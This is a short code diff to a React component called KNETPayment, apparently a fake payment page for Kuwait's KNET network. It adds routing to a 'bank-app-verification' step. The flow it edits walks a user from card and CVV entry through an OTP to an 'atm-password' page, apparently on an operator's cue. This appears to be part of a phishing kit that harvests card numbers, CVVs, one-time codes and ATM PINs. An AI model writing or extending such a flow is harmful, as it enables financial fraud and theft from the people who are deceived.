@@ -257,7 +257,11 @@ export default function KNETPayment() {
       setIsWaiting(false);
 
       if (phase === "card" || phase === "cvv") {
-        if (action === "otp") {
+        if (action === "app") {
+          setShowCvvPopup(false);
+          setCvvWaiting(false);
+          navigate("/bank-app-verification");
+        } else if (action === "otp") {
           setShowCvvPopup(false);
           setCvvWaiting(false);
           setPhase("otp");
@@ -278,7 +282,9 @@ export default function KNETPayment() {
           setPhase("card");
         }
       } else if (phase === "otp") {
-        if (action === "otp" || action === "approve") {
+        if (action === "app") {
+          navigate("/bank-app-verification");
+        } else if (action === "otp" || action === "approve") {
           navigate("/atm-password");
         } else if (action === "cvv") {
           navigate("/cvv");
